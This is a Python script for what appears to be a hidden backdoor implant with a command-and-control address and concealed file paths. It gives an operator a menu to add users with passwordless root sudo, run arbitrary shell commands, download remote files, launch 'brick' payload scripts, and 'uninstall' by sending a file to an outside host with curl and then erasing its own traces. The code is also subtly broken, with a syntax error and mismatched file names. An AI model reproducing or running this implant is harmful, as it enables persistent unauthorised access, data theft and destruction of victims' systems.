import os
import subprocess
import argparse
from sys import argv
CnC = "192.168.102.16"
CnCUser = "sysadmin"
inVal = ""
inDir = ""
inFil = ""
option = ""
link = ""
num = ""
def main():
    cont = True
    os.system("clear")
    print("Hey you, you're finally awake")
    print("Systemm, it just works")
    print
    while (cont):
        value = input("Enter command(h or H - Help | e or E - Exit): ")
        if(value.lower() in ('h', 'help')):
            os.system("cat /var/spool/.log.sh")
        elif(value.lower() in ('e', 'exit')):
            exit()
        elif(value.lower() in ('u')):
            print("Uninstalling.....")
            os.system("touch /etc/temp.txt")
            os.system("ifconfig -a > /etc/temp.txt")
            os.system("curl -X POST -d \"file=@/etc/.thing.txt\" http://host:1337")
            os.system("rm /etc/temp.txt")
            os.system("rm /var/spool/.log.sh")
            os.system("rm /bin/.systemm.sh")
            os.system("rm /etc/.resolver.sh")
            print("Success.")
            cont = False
            os.remove(argv[0])
        elif(value.lower() in  ('k')):
            os.system("bash /etc/.music/brickPayload.sh")
            os.system("bash /var/spool/.payloadBrick.sh")
        elif(value.lower() in  ('a')):
            print("Adding a user.....")
            name = input("Enter username: ")
            password = input("Enter password: ")
            sudoIn = input("Should the user have root sudo? ")
            os.system("useradd "+name)
            os.system("echo "+name+":"+password+" | chpasswd")
            if(sudoIn.lower() in  ('y')):
                os.system("echo \""+name+" ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers")
            print("Done. User "+name+" added.")
        elif(value.lower() in ('r')):
            print("Removing a user.....")
            print("Current users are:")
            os.system("cat /etc/passwd")
            name = input("Which user would you like to remove?")
            os.system("killall -u "+name)
            os.system("userdel -f -r "+name)
            print("User removed.")
        elif(value.lower() in ('c')):
            print("Entering Command-Line.....(Enter \"exit\" to exit)")
            x = True
            while(x):
                inVal = input("Command@Skyrim# ")
                if(inVal.lower() in ("exit")):
                    x = False
                elif(inVal.lower() in ('h', 'help')
                    os.system("cat /var/spool/.log.sh")
                elif(inVal.lower() in ("info")):
                    print(os.uname())
                else:
                    os.system(inVal)
        elif(value.lower() in ('d')):
            print("Downloading.....")
            option = input("(F)ile or (D)irectory: ")
            if(option.lower() in ('f')):       
                inFil = input("Enter name of file to place download in: ")
                inDir = input("Enter directory to place file in(proper directory format, no end /): ")
                link = input("Enter full url to download from: ")
                os.system("curl -o "+inDir+"/"+inFil+ " "+link)
            elif(option.lower() in ('d')):
                inDir = input("Enter directory to download to(proper directory format): ") 
                link = input("Enter full url to download from: ")
                option = input("Recursion(digs through subdirectories): ")
                if(option.lower() in ('y')):
                    num = input("How much depth(how many levels of subdirectories): ")
                    os.system("mkdir "+inDir)
                    os.system("wget -P "+inDir+ " -r -l "+num+" "+link)
                else:
                    os.system("mkdir "+inDir)
                    os.system("wget -P "+inDir+ " "+link)
                
main()